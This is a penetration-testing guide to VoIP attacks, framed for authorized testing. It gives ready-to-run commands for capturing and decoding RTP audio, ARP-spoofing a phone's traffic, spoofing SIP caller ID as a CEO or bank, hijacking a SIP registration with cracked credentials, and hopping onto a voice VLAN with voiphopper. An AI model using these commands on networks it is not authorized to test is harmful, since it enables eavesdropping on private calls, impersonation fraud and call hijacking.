# VoIP Eavesdropping and Spoofing

> Guide covering RTP interception, SIP caller ID spoofing, call hijacking, and VLAN hopping with voiphopper.

## Overview

VoIP eavesdropping and spoofing attacks exploit the fact that many VoIP deployments transmit signaling and media traffic without encryption. When SIP signaling is unencrypted (plain UDP on port 5060) and RTP media streams lack SRTP protection, an attacker with network access can listen to conversations, impersonate callers, and hijack active calls. This guide covers the techniques and tools for testing these vulnerabilities during authorized penetration tests.

---

## RTP Stream Interception

### Understanding RTP Media Flow

When a SIP call is established, the two endpoints negotiate RTP media ports via the Session Description Protocol (SDP) payload inside the SIP INVITE and 200 OK messages. The actual voice audio travels as RTP packets on the negotiated UDP ports, typically within the range 10000-20000.

Without SRTP encryption, RTP payloads are raw audio samples (typically G.711 A-law or u-law codec) that can be captured and decoded directly.

### Passive RTP Capture

The simplest eavesdropping method is passive capture on the voice VLAN. If you have gained access to the voice VLAN (via VLAN hopping or a compromised host on the voice segment), you can capture all RTP traffic:

```bash
# Capture all RTP traffic on the voice VLAN
tcpdump -i eth0.100 -w voip_capture.pcap 'udp portrange 10000-20000'

# Capture both SIP signaling and RTP media
tcpdump -i eth0.100 -w full_voip.pcap \
  'udp port 5060 or udp portrange 10000-20000'

# Capture RTP for a specific endpoint
tcpdump -i eth0.100 -w target_rtp.pcap \
  host 10.0.0.5 and udp portrange 10000-20000
```

### Active Interception via ARP Spoofing

If you are not on the voice VLAN but share a broadcast domain with VoIP endpoints, ARP spoofing can redirect RTP traffic through your machine:

```bash
# Enable IP forwarding to avoid disrupting traffic
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poison between VoIP phone and default gateway
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1
arpspoof -i eth0 -t 10.0.0.1 10.0.0.5

# Capture the redirected traffic
tcpdump -i eth0 -w intercepted_voip.pcap \
  'host 10.0.0.5 and (udp port 5060 or udp portrange 10000-20000)'
```

This technique is more aggressive and may be detected by ARP monitoring tools. Use it only with explicit authorization.

### Decoding Captured Audio

Once you have a PCAP file containing RTP streams, decode the audio for analysis:

Using Wireshark (graphical):

1. Open the PCAP file in Wireshark.
2. Navigate to Telephony -> RTP -> RTP Streams.
3. Identify the RTP stream you want to decode.
4. Click "Analyze" and then "Save" to export the payload.
5. Use the RTP Player (Telephony -> RTP -> RTP Player) to play back audio.

Using command-line tools:

```bash
# Extract RTP payload data from PCAP
tshark -r voip_capture.pcap -R rtp -T fields -e rtp.payload

# Convert raw payload to WAV audio file
tshark -r voip_capture.pcap \
  --rtp-stream-filter='10.0.0.5:10000-10.0.0.6:10000' \
  -T fields -e rtp.payload | \
  tr -d '\n:, ' | xxd -r -p | \
  sox -t raw -b 16 -e signed -r 8000 -c 1 - decoded_audio.wav
```

### Detecting SRTP Encryption

If RTP payloads appear as random binary data and cannot be decoded, the system may be using SRTP. This is a positive security finding — report that encryption is properly implemented and eavesdropping is not feasible.

---

## SIP Caller ID Spoofing

### How SIP Caller ID Works

SIP uses the `From` header to identify the caller. The display name and SIP URI in the `From` header are what the recipient sees on their phone display. If the SIP server does not validate the `From` header against the authenticated user, any caller can forge their identity.

### Crafting Spoofed INVITE Requests

Using sipsak to test caller ID spoofing:

```bash
# Spoof the From header to appear as a different extension
sipsak -I -s sip:200@target.lab -H 10.0.0.1 \
  --from "CEO <sip:100@target.lab>"

# Spoof as an external number
sipsak -I -s sip:200@target.lab \
  --from "Bank Security <sip:+18005551234@external.com>"
```

A successful spoof results in the target phone displaying the forged caller ID information. This has serious implications for social engineering attacks — an attacker could impersonate executives, IT staff, or external organizations.

### Testing Server Validation

The key question is whether the PBX validates the `From` header against the authenticated session. Test with both authenticated and unauthenticated INVITE requests:

1. Register with legitimate credentials and place a call with a modified `From` header.
2. Send an unauthenticated INVITE with a spoofed `From` header.
3. Check if the PBX rewrites the `From` header or passes it through unchanged.

---

## Call Hijacking via Registration Manipulation

### SIP Registration Hijacking

SIP registration maps an extension (Address-of-Record) to a Contact URI (the device that should receive calls). If an attacker can register an extension with their own Contact URI, all incoming calls to that extension will be routed to the attacker's device.

```bash
# Register extension 100, binding to attacker's IP
sipsak -U -s sip:100@target.lab \
  -u 100 -a crackedpassword \
  --from "100 <sip:100@10.0.0.99>"

# De-register the legitimate device first
sipsak -U -s sip:100@target.lab \
  -u 100 -a crackedpassword \
  -e 0
```

After hijacking the registration, all calls to extension 100 will ring the attacker's device instead of the legitimate phone.

### Detecting Registration Hijacking Defenses

A well-configured PBX will:

- Enforce that the `Contact` URI matches the source IP of the registration request.
- Limit registration to known device MAC addresses or IP ranges.
- Alert on rapid registration changes for the same extension.
- Implement SIP registration throttling.

---

## VLAN Hopping with voiphopper

### Understanding VoIP VLAN Architecture

Many organizations place VoIP devices on a dedicated voice VLAN for Quality of Service (QoS) and security segmentation. IP phones typically discover their voice VLAN through the Cisco Discovery Protocol (CDP) or LLDP-MED. The switch port is configured as a trunk carrying both the data VLAN (untagged) and voice VLAN (tagged with 802.1Q).

`voiphopper` exploits this by impersonating a Cisco IP phone to negotiate a connection on the voice VLAN.

### CDP-Based VLAN Hopping

```bash
# Automatic CDP-based voice VLAN discovery and join
voiphopper -i eth0 -C

# Spoof a specific Cisco phone model
voiphopper -i eth0 -C -a "SEP001122334455" -m "Cisco IP Phone 7940"

# Use CDP template index
voiphopper -i eth0 -c -z 1
```

When voiphopper succeeds, it creates a network interface on the voice VLAN and obtains an IP address via DHCP. From this position, you can scan and attack all VoIP infrastructure.

### DHCP-Based Voice VLAN Discovery

If CDP is disabled or filtered, voiphopper can also attempt DHCP-based discovery:

```bash
# Discover voice VLAN via DHCP option 150 or 66
voiphopper -i eth0 -D

# Combined approach
voiphopper -i eth0 -C -D
```

### Manual 802.1Q Tagging

If you know the voice VLAN ID (from CDP capture or network documentation), you can manually create a tagged interface:

```bash
# Capture CDP to discover voice VLAN ID
tcpdump -i eth0 -nn -vve ether dst 01:00:0c:cc:cc:cc -c 5

# Create 802.1Q tagged interface for VLAN 100
ip link add link eth0 name eth0.100 type vlan id 100
ip link set eth0.100 up
dhclient eth0.100

# Scan the voice VLAN
svmap -i eth0.100 10.0.100.0/24
```

---

## Key Takeaways

1. Unencrypted RTP streams are a critical finding — they allow complete conversation eavesdropping.
2. SRTP prevents eavesdropping. Always verify whether SRTP is in use before reporting RTP exposure.
3. Caller ID spoofing is possible when the PBX does not validate `From` headers against authenticated sessions.
4. Registration hijacking requires valid credentials but allows complete call interception.
5. VLAN hopping via CDP is one of the most effective VoIP-specific network attacks — verify CDP is disabled on user-facing ports.
6. ARP spoofing for RTP interception is noisy and may be detected — prefer passive capture when on the voice VLAN.
7. Document all eavesdropping evidence with PCAP samples and decoded audio to demonstrate impact.
